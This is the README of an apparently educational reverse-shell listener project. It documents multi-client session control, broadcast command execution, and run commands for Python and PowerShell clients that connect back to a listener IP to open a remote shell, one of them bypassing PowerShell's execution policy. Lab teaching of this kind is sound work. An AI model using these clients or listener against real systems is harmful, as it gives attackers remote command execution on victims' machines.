# Listener V3 — Professional Reverse Shell Listener

> **For authorized academic, research, and laboratory use only.**
>
> This repository provides `Listener_V3.py`, a professional reverse-shell listener designed for classroom labs, supervised red-team exercises, and research demonstrations. Use this repository only on systems you own or where you have explicit written authorization. Unauthorized use is illegal and unethical.

---

## Abstract

This project supplies a robust, well-documented reverse-shell *listener* (server) and cooperating client examples for Linux and Windows. The listener is engineered for reliability and operator usability in university lab settings: multi-client support, clear operator workflow, rotating logs, and a collection strategy that does not require an explicit end-of-output marker. The design emphasizes reproducibility, safe lab practices, and integration into structured courses or research projects.

---

## Table of Contents

* [Intended Academic Use](#intended-academic-use)
* [Key Features](#key-features)
* [Prerequisites](#prerequisites)
* [Installation and Verification](#installation-and-verification)
* [Running the Listener (Examples)](#running-the-listener-examples)
* [Operator Workflow and Commands](#operator-workflow-and-commands)
* [Cooperating Client Examples (Linux & Windows)](#cooperating-client-examples-linux--windows)
* [Configuring Target (Listener) IP](#configuring-target-listener-ip)
* [Classroom Deployment & Assessment Ideas](#classroom-deployment--assessment-ideas)
* [Testing, Reproducibility & CI suggestions](#testing-reproducibility--ci-suggestions)
* [Security, Ethics & Legal Considerations](#security-ethics--legal-considerations)
* [Development, Contribution & Versioning](#development-contribution--versioning)
* [Citation / Acknowledgements](#citation--acknowledgements)
* [ChangeLog (high level)](#changelog-high-level)

---

## Intended Academic Use

This project is intended as a controlled teaching and research tool for instructors and students in cybersecurity, digital forensics, and red-team/blue-team exercises. Instructors can integrate the listener and its clients into hands-on labs that teach network programming, secure communications, incident response analysis, and operational security practices.

Suggested uses:

* Classroom labs demonstrating reverse shells and secure alternatives (SSH, mutual TLS).
* Exercises on protocol design and reliable I/O without end-markers.
* Graded labs on secure hardening and threat emulation within an isolated network.

---

## Key Features

* Multi-client concurrent support (thread-per-client) with clean session management.
* Operator-oriented terminal UI with colored, timestamped output (via `colorama`).
* No end-marker required — uses non-blocking reads and short idle windows to delimit outputs.
* Optional pre-shared-token authentication for lab access control.
* Rotating-file logging for auditability and disk management.
* Operator commands: `clients`, `select <id>`, `broadcast <cmd>`, `help`, `clear`, `info`, `exit`.

---

## Prerequisites

* Python 3.8 or later (server and Python client).
* `colorama` for server UI: `pip install colorama`.
* For Windows exercises: PowerShell 5.1+ (Windows 10+) or PowerShell Core.

Recommended lab environment:

* Isolated VLAN or lab network segment.
* VM images for students (preinstalled Python, PowerShell).

---

## Installation and Verification

1. Clone the repository on the lab host or instructor machine.

```bash
git clone https://github.com/webixly/Webixly-reverce.git
cd Webixly-reverce 
```

2. Create a Python virtual environment and install dependencies:

```bash
python3 -m venv venv
source venv/bin/activate   # Windows: venv/Scripts/activate
pip install -r requirements.txt  # or `pip install colorama`
```

3. Basic syntax check:

```bash
python -m py_compile Listener_V3.py
```

4. Run a smoke test locally (listener + local client) to verify functionality before classroom deployment.

---

## Running the Listener (Examples)

**Start listener with token authentication (recommended for classroom access control):**

```bash
python3 Listener_V3.py --host 0.0.0.0 --port 4444 --token mylabtoken
```

**Start listener without authentication (for isolated lab VMs only):**

```bash
python3 Listener_V3.py --host 0.0.0.0 --port 4444 --no-auth
```

Upon start the server prints a banner and an operator prompt `server>`.

---

## Operator Workflow and Commands

From the `server>` prompt the instructor or student operator may use:

* `help` — print help text.
* `clients` — list active connections and client IDs.
* `select <id>` — attach to a client session for interactive commands.
* `broadcast <command>` — send a command to all connected clients.
* `clear` — clear the console.
* `info` — print server status and log path.
* `exit` / `quit` — shutdown server and close clients.

**Example:**

```text
server> clients
[Clients]
 # 1  10.0.2.15:52344    alive    connected 30s
server> select 1
server> whoami
> OUTPUT — 2025-10-20 15:12:15
  student
```

---

## Cooperating Client Examples (Linux & Windows)

Two minimal cooperating clients are included to support teaching exercises. They are intentionally simple and documented so students can read, modify, and improve them.

* `client_python.py` (Linux/macOS): Python client that connects, optionally replies to `TOKEN?`, receives newline-terminated commands, executes them, and returns stdout+stderr bytes.
* `client_windows.ps1` (Windows): PowerShell client that implements the same cooperating behavior.

**Instructor note:** Provide pre-built VM images with the client scripts or the commands to fetch them to ensure a reproducible lab.

---

## Configuring Target (Listener) IP

Students can point the client at the listener via:

1. **Command-line parameters** (recommended):

   * Linux: `python3 client_python.py --host <LISTENER_IP> --port 4444 --token mylabtoken`.
   * Windows: `powershell -ExecutionPolicy Bypass -File client_windows.ps1 -Host <LISTENER_IP> -Port 4444 -Token "mylabtoken"`.

2. **Hard-coded** values (for pre-baked clients): directly modify the default host constant in the client script.

Always validate network reachability (ping, traceroute, or `nc` tests) before the lab session.

---

## Classroom Deployment & Assessment Ideas

* **Guided lab** — Instructor provides listener and client; students connect one-by-one and demonstrate basic commands (whoami, pwd, ls). Assessment: correct setup and evidence of captured output.
* **Protocol design task** — Students modify the client to implement a small reliable framing protocol (e.g., length-prefix) and compare robustness vs. idle-detection.
* **Hardening exercise** — Students harden the listener with TLS and present a short report on remaining risks.
* **Incident response/forensics** — Simulate a compromised host by running the client and task students to detect and characterize the activity from logs.

Assessment rubric examples (suggested):

* 40% Functional correctness (connects and exchanges data).
* 30% Robustness (handles disconnects, partial output).
* 20% Security hardening and documentation.
* 10% Code quality and testing.

---

## Testing, Reproducibility & CI suggestions

* Add unit tests for utility modules (parsing, logging configuration).
* Use a CI pipeline (GitHub Actions) to run `python -m py_compile` and basic linting on PRs.
* Provide a `Vagrantfile` or lightweight Docker image for reproducible student environments.

---

## Security, Ethics & Legal Considerations

This software is for educational, research, and authorized testing only.

* Obtain written authorization for any exercise that involves non-lab hosts.
* Never run these tools on production networks or internet-facing hosts without explicit permission.
* Keep exercises within isolated lab VLANs, with logging and monitoring enabled.
* Remove or disable any persistence features in student-provided clients unless specifically approved and controlled.

---

## Development, Contribution & Versioning

* Follow Git feature-branch workflows. Example branch names: `feature/<name>`, `fix/<name>`.
* Keep changelog entries concise and include migration notes for breaking changes.
* Use semantic versioning for releases (MAJOR.MINOR.PATCH).

---

## Citation & Acknowledgements

If you adapt these materials for an academic publication, please include a short acknowledgment in the paper or lab manual. Example citation in text:

> "Listener V3 — a teaching-oriented reverse-shell listener (author: project maintainer) — used in classroom exercises."

---

## ChangeLog (high level)

* **v3** — Professional UI, multi-client support, idle-detection output collection, rotating logs, optional token auth.

---

*Prepared for university teaching, lab exercises, and authorized research.*
